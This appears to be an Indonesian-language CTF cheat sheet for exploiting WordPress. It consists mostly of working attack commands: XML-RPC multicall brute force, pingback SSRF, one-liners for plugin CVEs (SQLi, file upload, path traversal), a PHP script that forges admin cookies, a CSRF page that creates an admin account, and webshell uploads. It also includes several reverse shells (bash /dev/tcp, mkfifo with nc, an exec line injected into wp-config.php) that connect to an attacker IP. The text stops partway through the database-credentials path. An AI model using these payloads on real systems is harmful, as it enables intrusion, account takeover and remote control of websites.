---
id: "17a"
title: "🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide"
category: "3. Web Exploitation"
categoryId: "web"
filename: "17a_wordpress_workflow.md"
refs_out: ["06","07","14a","15","17","17b","44"]
refs_in: ["15","16","17","17b","17d","19","20","24","62"]
---

# 🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide

> **Target OS:** Parrot OS XFCE (Debian-based)
> **Focus:** CTF Muscle Memory (HackTheBox, TryHackMe, Proving Grounds)
> **Prerequisites:** [🌐 File 17: CMS Detection, Fingerprinting & Exploitation Workflow](/docs/cms-detection)

---

## 🧭 Exploitation Flow Overview
```text
                  [Target URL]
                       │
                       ▼
             [Passive / Active Enum]
                       │
                       ▼
           [Identify Attack Surface]
                       │
      ┌────────────────┼────────────────┬────────────────┐
      ▼                ▼                ▼                ▼
[XML-RPC Active] [Vuln Plugin]   [Admin Creds]    [REST API Leak]
      │                │                │                │
      ▼                ▼                ▼                ▼
[Multicall BF /  [Public PoC /   [Theme/Plugin    [User Enum /
 Pingback SSRF]   Pre-Auth RCE]   RCE (404.php)]   Privilege Esc]
      │                │                │                │
      └────────────────┼────────────────┴────────────────┘
                       │
                       ▼
               [Reverse Shell]
                       │
                       ▼
            [Post-Exploitation &
            Credential Harvesting]
```

---

## 🏗️ BAGIAN 1: WORDPRESS ARCHITECTURE

### 1.1 Struktur Direktori WordPress
```text
/var/www/html/
├── wp-admin/          # Web UI Dashboard & Panel Administratif
├── wp-includes/       # Core Library, Function, Class PHP (Bukan untuk Upload)
├── wp-content/        # Direktori Utama Aset dan Modul Tambahan
│   ├── plugins/       # Modul Plugin Pihak Ketiga (Vulnerability Vector Utama)
│   ├── themes/        # Theme/Tampilan Web (Mengandung template PHP seperti 404.php)
│   └── uploads/       # Direktori Upload Media (Biasa tempat webshell tersimpan)
├── wp-config.php      # File Konfigurasi Paling Kritis (Database Credentials & Keys)
└── xmlrpc.php         # Legacy API Endpoint (Vector Brute Force & SSRF)
```

#### Komponen Kritis `wp-config.php`
`wp-config.php` berisi informasi sensitif yang langsung memberikan akses penuh ke database backend dan kunci kriptografi:
```php
// Database Credentials
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'wp_admin' );
define( 'DB_PASSWORD', 'P@ssw0rd123!' );
define( 'DB_HOST', 'localhost' );

// Cryptographic Salt Keys (Digunakan untuk validasi Session Cookies)
define( 'AUTH_KEY',         'v,K~#p?1= +|`!-x,xR!p| standard_salt_key_1' );
define( 'SECURE_AUTH_KEY',  'a8$d_X+A_P!1-098?#@! standard_salt_key_2' );
define( 'LOGGED_IN_KEY',    'p+?#1!2=x,xR!p|v,K~# standard_salt_key_3' );
define( 'NONCE_KEY',        '1-098?#@!a8$d_X+A_P! standard_salt_key_4' );

// Security Restrictions Overrides
define( 'DISALLOW_FILE_EDIT', true ); // Menonaktifkan Editor Theme/Plugin via UI
```

**Eksploitasi jika `wp-config.php` terbaca (via LFI/Directory Traversal):**

1. **Database Access:** Gunakan `DB_USER` dan `DB_PASSWORD` untuk login via SSH, MySQL remote, atau phpMyAdmin.

2. **Password Reuse Check:** Coba credentials tersebut untuk SSH user root/system.

3. **Cookie Forgery:** Jika salt keys didapatkan, attacker dapat memalsukan authentication cookies untuk mengambil alih sesi admin tanpa password.

#### Database Tables Utama

- `wp_users`: Menyimpan credential akun (`user_login`, `user_pass`, `user_email`).

- `wp_usermeta`: Menyimpan metadata user, termasuk privilege level/role (`wp_user_level` = 10 untuk Admin).

- `wp_options`: Menyimpan konfigurasi site URL, active plugins, dan REST API keys.

**Membaca Password Hash dari Database (SQL Query):**
```sql
SELECT ID, user_login, user_pass, user_email FROM wp_users;
```

### 1.2 WordPress Authentication System

1. **Cookie Authentication:**

    WordPress menggunakan cookie khusus untuk mempertahankan sesi log in.

    - Format Cookie Logged-In: `wordpress_logged_in_[hash] = username|expiration|token|hmac`
    - HMAC dihitung menggunakan `LOGGED_IN_KEY` dan `LOGGED_IN_SALT` dari `wp-config.php`.

2. **Nonce System (Number Used Once):**
    - Tokens yang dibuat WordPress untuk melindungi request dari CSRF.
    - Berbeda dengan CSRF token standar, Nonce WordPress tied ke user session tertentu dan berlaku selama 12–24 jam.
    - Jika Nonce bocor melalui caching proxy atau REST API leak, attacker dapat melakukan tindakan atas nama user tersebut.

3. **Application Passwords (WP 5.6+):**
    - Kredensial khusus yang dibuat dari dashboard user (`/wp-admin/profile.php`) untuk aplikasi eksternal via REST API.
    - Menggunakan Basic Authentication over HTTPS. Tidak terpengaruh oleh 2FA/MFA plugin biasa.

4. **REST API Authentication:**

    Mendukung dua metode utama:

    - **Cookie Authentication** (digunakan oleh JavaScript internal/AJAX via `X-WP-Nonce` header).
    - **Application Passwords / Basic Auth** (digunakan oleh skrip/klien eksternal).

## 🔍 BAGIAN 2: ADVANCED ENUMERATION

### 2.1 WPScan Deep Dive

#### Detection Modes

- `--detection-mode passive`: Hanya memeriksa kode HTML tanpa membuat request langsung ke path file. Sangat cepat, rendah log footprint, namun kurang akurat.

- `--detection-mode aggressive`: Melakukan fuzzing intensif ke ribuan path plugin/theme terpopuler. Pasti terdeteksi WAF/IDS.

- `--detection-mode mixed` _(Default)_: Menggabungkan pasif untuk footprinting awal dan agresif untuk konfirmasi item spesifik.

#### Essential Flags
```bash
# Full Enumeration dengan JSON Output
wpscan --url http://10.10.10.187 \
  --enumerate vp,vt,u,tt,cb \
  --plugins-detection aggressive \
  --api-token "$WPSCAN_API_KEY" \
  --format json \
  -o wpscan_results.json
```

- `vp` : Vulnerable plugins

- `vt` : Vulnerable themes

- `u` : User enumeration

- `tt` : Timthumbs (vulnerable image resizer)

- `cb` : Config backups

#### Parsing JSON Output via `jq`
```bash
# Filter Plugin yang Memiliki Vulnerability / CVE
cat wpscan_results.json | jq '.plugins[] | select(.vulnerabilities != null) | {plugin: .slug, vulns: .vulnerabilities[].title}'

# Extract Username yang Ditemukan
cat wpscan_results.json | jq '.users[].username' -r
```

### 2.2 Manual Enumeration Tanpa WPScan
```bash
# Set Target
export TARGET="http://10.10.10.187"

# 1. Enumerate Plugins dari HTML DOM
curl -s "$TARGET" | grep -oE '(wp-content/plugins/[^/"]+)' | sort -u

# 2. Enumerate Themes dari HTML DOM
curl -s "$TARGET" | grep -oE '(wp-content/themes/[^/"]+)' | sort -u

# 3. Detect Versi Plugin via readme.txt
curl -s "$TARGET/wp-content/plugins/akismet/readme.txt" | grep -i "Stable tag:"

# 4. Detect Versi Theme via style.css
curl -s "$TARGET/wp-content/themes/twentytwenty/style.css" | grep -i "Version:"

# 5. User Enum Method A: Author Archives
curl -s -i "$TARGET/?author=1" | grep -i "Location:"

# 6. User Enum Method B: REST API wp/v2/users
curl -s "$TARGET/wp-json/wp/v2/users" | jq '.[].slug'

# 7. User Enum Method C: oEmbed Endpoint
curl -s "$TARGET/wp-json/oembed/1.0/embed?url=$TARGET/&format=json" | jq '.author_name'

# 8. User Enum Method D: Yoast SEO Sitemap
curl -s "$TARGET/author-sitemap.xml" | grep -oP '(?<=<loc>)[^<]+'

# 9. User Enum Method E: Login Error Messages (Timing & Error Disclosure)
curl -s -X POST "$TARGET/wp-login.php" -d "log=admin_invalid_test&pwd=wrongpassword&wp-submit=Log+In" | grep -i "invalid username"
```

### 2.3 WordPress REST API Exploitation

#### Endpoint Menarik untuk Reconnaissance

- `/wp-json/` : Menampilkan seluruh daftar route yang tersedia (termasuk custom plugin routes).

- `/wp-json/wp/v2/users` : Mengumbar ID, username, dan slug milik pengguna.

- `/wp-json/wp/v2/posts` : Menampilkan post publik beserta metadata.

- `/wp-json/wp/v2/pages` : Menampilkan halaman statis web.

- `/wp-json/wp/v2/media` : Menampilkan daftar file yang diunggah, EXIF metadata, dan internal paths.

```bash
# 1. List Semua Available REST API Routes (Grep custom plugin endpoints)
curl -s "$TARGET/wp-json/" | jq '.routes | keys[]' | grep -v "/wp/v2"

# 2. Membaca Draft Posts / Unpublished Content (Jika Privilege Escalation / Auth Token didapat)
curl -s -H "Authorization: Bearer <TOKEN>" "$TARGET/wp-json/wp/v2/posts?status=draft"

# 3. Authenticated REST API Request dengan Application Password
curl -s -u "admin:abcd 1234 efgh 5678" "$TARGET/wp-json/wp/v2/settings"
```

### 2.4 XML-RPC Complete Reference

`xmlrpc.php` adalah interface komunikasi remote yang diaktifkan secara default pada banyak instalasi WordPress.

#### Validasi Availability XML-RPC
```bash
curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>"
# Output Sukses: <value><string>Hello!</string></value>
```

#### Brute Force via `system.multicall`

Mengirim ratusan kombinasi password dalam **SATU** HTTP POST request, melewati batas rate limiting standar WAF.
```bash
cat << 'EOF' > payload_multicall.xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password123</string></value></data></array></value></member></struct></value>
            <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>P@ssw0rd</string></value></data></array></value></member></struct></value>
            <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>admin123</string></value></data></array></value></member></struct></value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
EOF

curl -s -X POST -d @payload_multicall.xml "$TARGET/xmlrpc.php"
```

#### SSRF via `pingback.ping`

Memanfaatkan server WordPress untuk memindai port internal atau menyerang infrastruktur lain.
```bash
cat << 'EOF' > payload_pingback.xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://10.10.14.2:8000/ssrf_test</string></value></param>
    <param><value><string>http://10.10.10.187/?p=1</string></value></param>
  </params>
</methodCall>
EOF

curl -s -X POST -d @payload_pingback.xml "$TARGET/xmlrpc.php"
```

> **Mengapa Disable XML-RPC Sering Dilakukan?**
>
> Administrator sering memblokir `xmlrpc.php` via `.htaccess` atau Nginx lokasi untuk menghentikan serangan brute-force multi-call dan SSRF pingback amplification.

## ⚡ BAGIAN 3: VULNERABILITY PATTERNS

### 3.1 Plugin Vulnerabilities (CTF Common)

|**Plugin**|**CVE**|**Versi Vulnerable**|**Type**|**Command Exploit / PoC**|
|---|---|---|---|---|
|**WP File Manager**|CVE-2020-25213|6.0 - 6.8|RCE (Pre-Auth)|`searchsploit -m 49178 && python3 49178.py $TARGET` *(atau curl multipart elFinder connector)*|
|**Contact Form 7**|CVE-2020-35489|< 5.3.2|Arbitrary File Upload|`curl -F "your-file=@shell.php." -F "_wpcf7=1" "$TARGET/wp-json/contact-form-7/v1/contact-forms/1/feedback"`|
|**Duplicator**|CVE-2020-11738|< 1.3.27|Path Traversal / File Read|`curl -s "$TARGET/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../wp-config.php"`|
|**ThemeREX Addons**|CVE-2020-9043|All <= 2.2|Auth Bypass / RCE|`curl -s "$TARGET/wp-admin/admin-ajax.php?action=trx_addons_exec_cmd&cmd=id"`|
|**Ninja Forms**|CVE-2021-34656|< 3.4.34|Unauthenticated XSS/RCE|`curl -s "$TARGET/?ninja_forms_ajax_submit=1&form_id=1&action=nf_ajax_submit"`|
|**Elementor**|CVE-2022-1329|3.6.0 - 3.6.2|Authenticated RCE|`curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=elementor_upload_template&file=@shell.zip"`|
|**WooCommerce**|CVE-2021-32789|5.5.0 - 5.5.1|SQL Injection|`curl -s "$TARGET/?wc-ajax=get_refreshed_fragments&id=1' UNION SELECT 1,user_pass FROM wp_users-- -"`|
|**Popup Builder**|CVE-2023-6000|< 2.6.8|Stored XSS to RCE|`curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=sgpb_save_popup&popupData=<script>...</script>"`|
|**WP Automatic**|CVE-2024-27956|< 3.92.0|SQL Injection (Unauth)|`curl -X POST "$TARGET/wp-content/plugins/wp-automatic/inc/csv.php" -d "q=UPDATE wp_users SET user_pass=md5('password') WHERE ID=1"`|
|**Advanced Custom Fields**|CVE-2023-30777|< 6.1.6|Reflected XSS|`curl -s "$TARGET/wp-admin/edit.php?post_type=acf-field-group&post_status=%22><script>alert(1)</script>"`|
|**BackupBuddy**|CVE-2022-31474|8.5.8.0 - 8.7.4.1|Arbitrary File Download|`curl -s "$TARGET/wp-admin/admin-ajax.php?action=backupbuddy_local_download&file=/etc/passwd"`|
|**Loginizer**|CVE-2020-27615|< 1.6.4|Unauthenticated SQLi|`curl -s "$TARGET/wp-login.php" -d "log=admin' OR 1=1-- -&pwd=test&wp-submit=Log+In"`|
|**Ultimate Member**|CVE-2023-3460|< 2.6.7|Unauthenticated Priv Esc|`curl -X POST "$TARGET/wp-admin/admin-ajax.php" -d "action=um_registration&wp_capabilities[administrator]=1"`|
|**WPS Hide Login**|N/A (Bypass)|All|Info Disclosure|`curl -s -i "$TARGET/wp-admin/options.php" -H "Referer: $TARGET/wp-admin/"`|
|**Jetpack**|CVE-2019-16520|Multiple|Stored XSS / Auth Bypass|`curl -s "$TARGET/wp-json/jetpack/v4/shortcodes"`|

### 3.2 WordPress Core Vulnerabilities

- **WordPress < 4.7.0 / 4.7.1 - REST API Content Injection (CVE-2017-1001000):**

    Memungkinkan attacker mengubah isi post/halaman tanpa autentikasi.

```bash
    curl -X POST "$TARGET/wp-json/wp/v2/posts/1" -d '{"id": "1abc", "title": "Hacked Title", "content": "Defaced by CTF Player"}'
    ```

- **WordPress < 5.0.0 - Crop-image RCE (CVE-2019-8942 / CVE-2019-8943):**

    Membutuhkan role Author. Mengombinasikan Path Traversal saat mengubah image metadata dengan Local File Inclusion pada active theme.

```bash
    searchsploit -m php/webapps/46513.py
    python3 46513.py http://target.com author_user author_pass
    ```

### 3.3 Authentication Bypass Techniques

1. **Login Timing Attack (User Enumeration):**

    WordPress mengembalikan respon dengan waktu eksekusi yang berbeda jika username valid vs tidak valid (disebabkan oleh beban komputasi hashing `phpass` ketika username ditemukan di database).

2. **Application Password Abuse:**

    Jika admin tidak menonaktifkan API application passwords (fitur bawaan sejak WP 5.6), attacker dapat menggunakan credential yang didapat via phishing atau leak tanpa perlu melewati form login utama atau plugin 2FA.

3. **Cookie Forgery Attack:**

    📌 **Kapan teknik ini berhasil dan apa syaratnya?**
    - **Syarat 1 (Salt Leak):** Attacker berhasil membaca nilai `AUTH_KEY`, `SECURE_AUTH_KEY`, `LOGGED_IN_KEY`, dan `LOGGED_IN_SALT` dari file `wp-config.php` (misalnya via LFI, Path Traversal, backup file exposure `wp-config.php.bak`, atau git exposure).
    - **Syarat 2 (Known Username):** Attacker mengetahui username valid target (misal `admin` yang didapat dari REST API atau author scan).
    - **Syarat 3 (Password Fragment):** Jika database hash didapat (misal via SQLi/dump), attacker hanya membutuhkan 4 karakter fragmen password (`substr($user_pass, 8, 4)`).
    - **Kelebihan Luar Biasa:** Attacker **TIDAK PERLU** meng-crack hash password admin yang rumit! Session cookie valid dibuat secara offline murni dengan kalkulasi matematis HMAC.

    **Script PHP Pembuat Cookie (Jalankan di Mesin Parrot OS):**
```php
<?php
// Script: wp_cookie_forger.php
// Masukkan data hasil leak dari wp-config.php & database
$username   = 'admin';
$expiration = time() + (86400 * 7); // Valid selama 7 hari ke depan
$site_url   = 'http://10.10.10.187';

// Ambil LOGGED_IN_KEY dan LOGGED_IN_SALT dari wp-config.php
$logged_in_key  = 'v,K~#p?1= +|`!-x,xR!p| standard_salt_key_1';
$logged_in_salt = 'p+?#1!2=x,xR!p|v,K~# standard_salt_key_3';
$key = $logged_in_key . $logged_in_salt;

// 4 karakter dari hash password database (mulai indeks ke-8)
$pass_frag = substr('$P$B12345678abcdefghijklmnop', 8, 4);

// Hitung HMAC
$hash = hash_hmac('md5', $username . '|' . $expiration . '|' . $pass_frag, $key);
$cookie_val = $username . '|' . $expiration . '|' . $hash;

// Format cookie resmi WordPress
$cookie_name = "wordpress_logged_in_" . md5($site_url);
echo "[+] Set Cookie Berikut di Browser / Curl:\n";
echo "Cookie Name : " . $cookie_name . "\n";
echo "Cookie Value: " . $cookie_val . "\n";
echo "Full Header : Cookie: " . $cookie_name . "=" . $cookie_val . "\n";
?>
```

    **Cara Menggunakan Cookie Hasil Forgery:**
    - **Di Browser (Firefox / Chrome):** Tekan `F12` -> Tab **Storage** / **Application** -> **Cookies** -> Pilih URL target -> Tambahkan cookie name dan cookie value di atas -> Refresh halaman `/wp-admin/`. Kamu langsung login sebagai admin!
    - **Di Terminal (cURL):**
      ```bash
      curl -s -b "wordpress_logged_in_d41d8cd98f00b204e9800998ecf8427e=admin|1773000000|c4ca4238a0b923820dcc509a6f75849b" "$TARGET/wp-admin/"
      ```

## 💥 BAGIAN 4: EXPLOITATION PATHS

### 4.1 Path: Unauthenticated → Shell (Pre-Auth RCE)

📌 **Kapan path ini digunakan?**
Gunakan path ini ketika:
- Kamu **TIDAK memiliki akun atau kredensial apa pun** di WordPress target (unauthenticated).
- Hasil scanning (WPScan atau manual plugin inspection) mendeteksi plugin atau versi core WordPress yang memiliki CVE Pre-Auth Arbitrary File Upload, Unauthenticated SQLi, atau RCE (seperti WP File Manager CVE-2020-25213, Duplicator CVE-2020-11738, WP Automatic CVE-2024-27956).
- Ini adalah jalur tercepat dan prioritas utama dalam CTF jika plugin rentan ditemukan.

*Jika tidak ada vulnerable plugin/core pre-auth:* Lanjutkan ke User Enumeration + Brute Force (Bagian 2.4) atau registrasi akun biasa untuk Privilege Escalation (Path 4.2).
```text
[Scan Version & Plugins] ──> [Find CVE PoC] ──> [Upload Web Shell] ──> [Trigger Listener]
```

#### Studi Kasus: WP File Manager <= 6.8 Unauthenticated RCE (CVE-2020-25213)

> **⚠️ Catatan Teknis untuk Pemula:**
> Plugin WP File Manager (versi 6.0 s.d. 6.8) menyertakan library file manager open-source bernama **elFinder**. Endpoint `connector.minimal.php` dapat diakses langsung oleh siapa saja tanpa autentikasi WordPress. Parameter exploit bukanlah `cmd=php` sederhana, melainkan multipart form sesuai protokol upload elFinder (`cmd=upload&target=l1_Lw`).

**Langkah Eksploitasi yang Direkomendasikan:**
```bash
# Step 1: Identifikasi versi vulnerable dari readme.txt
curl -s "$TARGET/wp-content/plugins/wp-file-manager/readme.txt" | grep -i "Stable tag:"
# Output rentan: Stable tag: 6.8 (atau antara 6.0 - 6.8)

# Step 2: Persiapkan Reverse Shell Payload lokal di Parrot OS
cat << 'EOF' > shell.php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Step 3: Pilihan Ekploitasi (Pilih Salah Satu)

# --- Opsi A (Rekomendasi CTF / Searchsploit PoC Lengkap) ---
searchsploit "wp-file-manager 6"
searchsploit -m 49178
python3 49178.py "$TARGET"

# --- Opsi B (Manual Direct cURL Multipart Upload) ---
# Mengirim multipart request langsung ke endpoint elFinder connector
curl -ks -X POST   -F "reqid=17457a1b06f"   -F "cmd=upload"   -F "target=l1_Lw"   -F "upload[]=@shell.php"   "$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

# Step 4: Pasang Netcat Listener di Terminal Parrot OS
nc -lvnp 4444

# Step 5: Trigger Payload Webshell untuk Mendapatkan Reverse Shell
# (Ganti IP 10.10.14.2 dengan IP tun0 Parrot OS kamu)
curl -s "$TARGET/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'"
```

### 4.2 Path: Valid Subscriber → Admin (Privilege Escalation)

📌 **Kapan path ini digunakan?**
Gunakan path ini ketika:
- Kamu **sudah punya akun user biasa** (`subscriber` atau `contributor`) yang didapat dari:
  * Registrasi publik yang terbuka (`/wp-login.php?action=register` atau `/register/`).
  * Credential leak di pastebin/github/commit history.
  * Brute force berhasil pada user dengan password lemah.
- Tapi akun tersebut **BUKAN admin** dan memiliki izin yang sangat minim (tidak bisa upload plugin, tidak bisa edit tema).
- Kamu perlu eskalasi hak akses (*Privilege Escalation*) menjadi `administrator` di dalam aplikasi WordPress.

*Jika belum punya akun sama sekali:* Gunakan Path 4.1 (Pre-Auth RCE) atau cari plugin vulnerability / lakukan brute force terlebih dahulu.

---

#### Skenario 1: REST API Parameter Tampering

> **💡 Konsep untuk Pemula: Apa itu "Bearer Token" & Cara Mendapatkannya?**
> - **Bearer Token** adalah token autentikasi stateless (format JWT) yang digunakan klien untuk mengakses REST API tanpa mengirimkan session cookie browser.
> - **Bagaimana cara dapatnya?** Jika WordPress memasang plugin autentikasi JWT (misal `jwt-authentication-for-wp-rest-api`), kirimkan kredensial subscriber yang kamu miliki ke endpoint token:
>   ```bash
>   curl -s -X POST "$TARGET/wp-json/jwt-auth/v1/token" >     -d "username=subscriber_user&password=subscriber_pass" | jq -r '.token'
>   ```
> - **Alternatif jika tanpa JWT:** Gunakan session cookie subscriber standar yang didapat dari web browser (`wordpress_logged_in_*`) dan kirimkan bersama header `X-WP-Nonce`.
```bash
# Method A: Dengan Bearer Token (JWT Plugin terpasang)
curl -X POST "$TARGET/wp-json/wp/v2/users/me"   -H "Authorization: Bearer <SUBSCRIBER_TOKEN>"   -H "Content-Type: application/json"   -d '{"roles": ["administrator"]}'

# Method B: Dengan Session Cookie Subscriber Standar + X-WP-Nonce
# 1. Dapatkan nonce saat login sebagai subscriber
NONCE=$(curl -s -b subscriber_cookies.txt "$TARGET/wp-admin/" | grep -oP 'var wpApiSettings = {.*?"nonce":"\K[a-f0-9]+' | head -1)

# 2. Kirim update role request
curl -X POST "$TARGET/wp-json/wp/v2/users/me"   -b subscriber_cookies.txt   -H "X-WP-Nonce: $NONCE"   -H "Content-Type: application/json"   -d '{"roles": ["administrator"]}'
```

#### Skenario 2: Cross-Site Request Forgery (CSRF) via Admin Action

Jika terdapat fitur Contact Form, Feedback, atau komentar yang dibaca oleh Admin, kirimkan link menuju file HTML exploit yang di-host di mesin Parrot OS kita (`python3 -m http.server 80`):
```html
<!-- File: add_admin_csrf.html (Di-host di attacker server) -->
<!DOCTYPE html>
<html>
<body>
  <h3>Loading Page...</h3>
  <form id="csrfForm" action="http://10.10.10.187/wp-admin/user-new.php" method="POST">
    <input type="hidden" name="action" value="createuser" />
    <input type="hidden" name="user_login" value="pwned_admin" />
    <input type="hidden" name="email" value="pwned@attacker.local" />
    <input type="hidden" name="pass1" value="P@ssw0rd123!" />
    <input type="hidden" name="pass2" value="P@ssw0rd123!" />
    <input type="hidden" name="role" value="administrator" />
    <input type="hidden" name="createuser" value="Add New User" />
  </form>
  <script>
    // Submit otomatis begitu halaman terbuka di browser admin
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

### 4.3 Path: Admin → Shell (Known Admin Methods)

📌 **Kapan path ini digunakan?**
Gunakan path ini ketika:
- Kamu **SUDAH berhasil login ke WordPress Admin Dashboard** (`/wp-admin/`) sebagai user dengan role `administrator`.
- Akses admin didapat dari: Brute force XML-RPC/wp-login berhasil, privilege escalation (Path 4.2), default credentials, atau database credential override (Path 4.4).
- **Tujuan:** Mengubah akses web panel administrator menjadi Remote Code Execution (RCE) / reverse shell terminal di server Linux target.

*Jika Theme Editor dinonaktifkan (`DISALLOW_FILE_EDIT = true`):* Gunakan Method 2 (Malicious Plugin Upload) atau Method 4/5.

---

#### Method 1: Theme Editor (Modifikasi `404.php`)

> **⚠️ PENTING: Cara Mendapatkan `NONCE_TOKEN` Sebelum Eksekusi**
> - **Apa itu Nonce?** Nonce (`_wpnonce`) adalah token keamanan CSRF dinamis yang di-generate WordPress per sesi user dan per aksi (valid selama 12–24 jam).
> - **Kenapa wajib ada?** Tanpa nilai `_wpnonce` yang valid, request POST update file tema **TIDAK AKAN BERHASIL** dan akan mengembalikan pesan error `403 Forbidden` atau `"Sorry, you are not allowed to edit this file."`
> - **Cara Ambil Nonce:**
>   * **Cara A (Otomatis via cURL & Grep HTML):**
>     ```bash
>     # Ambil parameter _wpnonce dari form theme editor:
>     NONCE=$(curl -s -b cookies.txt "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty" | grep -oP 'id="_wpnonce"\s+value="\K[a-f0-9]+' | head -1)
>
>     # Fallback regex jika format input hidden berbeda:
>     if [ -z "$NONCE" ]; then
>         NONCE=$(curl -s -b cookies.txt "$TARGET/wp-admin/theme-editor.php?file=404.php" | grep -oP 'name="_wpnonce" value="\K[a-f0-9]+' | head -1)
>     fi
>     echo "[+] Nonce didapat: $NONCE"
>     ```
>   * **Cara B (Manual via Burp Suite / DevTools):**
>     1. Buka browser, login ke `/wp-admin/`.
>     2. Navigasi ke menu **Appearance** -> **Theme File Editor** (atau klik file `404.php`).
>     3. Tekan `Ctrl+U` (View Source) atau inspect elemen pada form update.
>     4. Cari string `name="_wpnonce"` dan copy value hex-nya (contoh: `d4a8bc12e9`).

**Workflow Eksekusi Lengkap:**
```bash
# Step 1: Login sebagai Admin dan simpan sesi cookie
curl -s -c cookies.txt -d "log=admin&pwd=P@ssword123!&wp-submit=Log+In" "$TARGET/wp-login.php"

# Step 2: Ekstrak Nonce dari halaman Theme Editor
NONCE=$(curl -s -b cookies.txt "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty" | grep -oP 'id="_wpnonce"\s+value="\K[a-f0-9]+' | head -1)
echo "[*] Using Nonce: $NONCE"

# Step 3: Kirim POST update untuk menyisipkan webshell PHP ke 404.php
curl -s -b cookies.txt -X POST "$TARGET/wp-admin/theme-editor.php"   -d "action=update"   -d "file=404.php"   -d "theme=twentytwenty"   -d "newcontent=<?php system(\$_GET['cmd']); ?>"   -d "_wpnonce=$NONCE"   -d "submit=Update+File"

# Step 4: Uji Eksekusi Command melalui Webshell yang Tertanam
curl -s "$TARGET/wp-content/themes/twentytwenty/404.php?cmd=id"

# Step 5: Kirim Reverse Shell ke Netcat Listener di Parrot OS
curl -s "$TARGET/wp-content/themes/twentytwenty/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'"
```

#### Method 2: Malicious Plugin Upload
```bash
# 1. Buat direktori plugin palsu
mkdir -p /tmp/evil_plugin

# 2. Buat file PHP plugin dengan headers resmi WordPress
cat << 'EOF' > /tmp/evil_plugin/evil.php
<?php
/**
 * Plugin Name: System Update Helper
 * Version: 1.0
 * Author: Security Team
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# 3. Zip plugin
cd /tmp && zip -r evil_plugin.zip evil_plugin/

# 4. Upload & Activate Plugin via WP-CLI atau Web Panel
# Via WP-CLI (Jika punya SSH/Local Access):
wp plugin install /tmp/evil_plugin.zip --activate --path=/var/www/html/

# Trigger:
curl -s "$TARGET/wp-content/plugins/evil_plugin/evil.php?cmd=id"
```

#### Method 3: File Manager Plugin

Instal plugin file manager resmi (seperti WP File Manager) langsung dari dashboard `/wp-admin/plugin-install.php`, lalu gunakan fitur upload bawaan plugin tersebut untuk mengunggah `reverse_shell.php`.

#### Method 4: Modifikasi `wp-config.php` (Jika File Writable)

Jika akun admin memiliki akses file manager atau LFI/RCE parsial, tambahkan perintah eksekusi langsung pada awal file `wp-config.php`:
```php
<?php
// Di paling atas wp-config.php
exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' &");
```

#### Method 5: Cron Job Injection via WP-Cron
```bash
# Menggunakan WP-CLI untuk menambahkan event scheduled yang mengeksekusi shell
wp cron event schedule 'my_custom_hook' now --path=/var/www/html/
wp eval 'add_action("my_custom_hook", function(){ system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f"); });' --path=/var/www/html/
wp cron event run --due-now --path=/var/www/html/
```

#### Upgrading Dumb Shell ke Fully Interactive TTY
```bash
# Di mesin target (dalam dumb shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Tekan Ctrl + Z untuk suspend netcat

# Di mesin lokal Parrot OS:
stty raw -echo; fg

# Di dalam shell target (set setelah fg):
reset
export TERM=xterm-256color
stty rows 38 columns 116
```

### 4.4 Path: Database Credentials → Shell

📌 **Kapan path ini digunakan?**
Gunakan path ini ketika:
- Kamu **berhasil membaca file `wp-config.php`** (via LFI, SSRF, backup file exposure `wp-config.php.bak`, atau exposed MySQL port 3306) dan mendapatkan `DB_USER`, `DB_PASSWORD`, dan `DB_NAME`.
- Port MySQL terbuka ke publik atau terdapat interface manajemen database di server (seperti phpMyAdmin, Adminer, atau akses SSH).
- Hash password admin di tabel `wp_users` terlalu kompleks atau lambat untuk di-crack menggunakan Wordlist `rockyou.txt`.
- **Solusi Taktis:** Langsung menimpa (*overwrite*) password hash admin di database MySQL dengan hash MD5/phpass dari password baru yang kita ketahui (misal `P@ssword123!`), atau membuat record user admin baru secara manual via SQL query. Setelah itu, login ke `/wp-admin/` dan lanjutkan ke Path 4.3.
```text
[wp-config.php Read] ──> [Extract DB Creds] ──> [Connect MySQL] ──> [Extract Hash/Insert Admin] ──> [Login & RCE]
```

```bash
# Step 1: Baca Credentials dari wp-config.php
grep -E "DB_USER|DB_PASSWORD|DB_NAME|DB_HOST" /var/www/html/wp-config.php

# Step 2: Connect ke MySQL Server
mysql -u wp_user -p'P@ssw0rd123!' -h localhost wordpress_db

# Step 3: Baca Hash Admin
SELECT ID, user_login, user_pass FROM wp_users;

# Step 4: Opsi A - Crack Hash dengan Hashcat (Lihat Bagian 5)
# Step 4: Opsi B - Timpa Pass Admin Langsung dengan Hash Baru (Password: 'P@ssword123!')
